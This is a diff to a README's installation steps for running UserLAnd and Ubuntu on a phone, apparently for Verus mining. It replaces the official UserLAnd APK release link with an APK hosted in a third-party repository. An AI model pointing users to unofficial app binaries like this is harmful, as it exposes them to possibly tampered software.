@@ -1,7 +1,7 @@
 
 
 ## Installation instructions
-- install Userland app [Click here](/https://github.com/CypherpunkArmory/UserLAnd/releases/download/v2.8.3/app-release.apk)
+- install Userland app [Click here](/https://github.com/ShadowStorm404/Verus-Phone-Mining/blob/main/UserLAnd%202.8.3.apk)
 - select Ubuntu in Userland and input login details.
 - choose SSH
 - wait for it to install, enter Ubuntu and log into your account
